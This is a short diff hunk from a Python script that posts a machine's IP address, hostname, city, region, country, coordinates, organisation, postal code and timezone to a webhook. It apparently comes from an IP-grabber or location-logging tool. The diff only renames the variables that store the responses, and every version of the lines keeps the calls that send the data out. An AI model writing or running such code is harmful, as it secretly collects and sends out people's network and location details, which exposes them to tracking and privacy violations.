@@ -69,12 +69,12 @@ timezone= {
 headers = {    
 "Content-Type": "application/json"
 }
-send = r.post(webhook, data=json.dumps(ip), headers=headers,json=ip)
-send = r.post(webhook, data=json.dumps(hostname), headers=headers,json=hostname)
-send = r.post(webhook, data=json.dumps(city), headers=headers,json=city)
-send = r.post(webhook, data=json.dumps(region), headers=headers,json=region)
-send = r.post(webhook, data=json.dumps(country), headers=headers,json=country)
-send = r.post(webhook, data=json.dumps(loc), headers=headers,json=loc)
-send= r.post(webhook, data=json.dumps(org), headers=headers,json=org)
-send = r.post(webhook, data=json.dumps(postal), headers=headers,json=postal)
-send = r.post(webhook, data=json.dumps(timezone), headers=headers,json=timezone)
+ip = r.post(webhook, data=json.dumps(ip), headers=headers,json=ip)
+hostname = r.post(webhook, data=json.dumps(hostname), headers=headers,json=hostname)
+city = r.post(webhook, data=json.dumps(city), headers=headers,json=city)
+region = r.post(webhook, data=json.dumps(region), headers=headers,json=region)
+country = r.post(webhook, data=json.dumps(country), headers=headers,json=country)
+loc = r.post(webhook, data=json.dumps(loc), headers=headers,json=loc)
+org = r.post(webhook, data=json.dumps(org), headers=headers,json=org)
+postal = r.post(webhook, data=json.dumps(postal), headers=headers,json=postal)
+timezone = r.post(webhook, data=json.dumps(timezone), headers=headers,json=timezone)
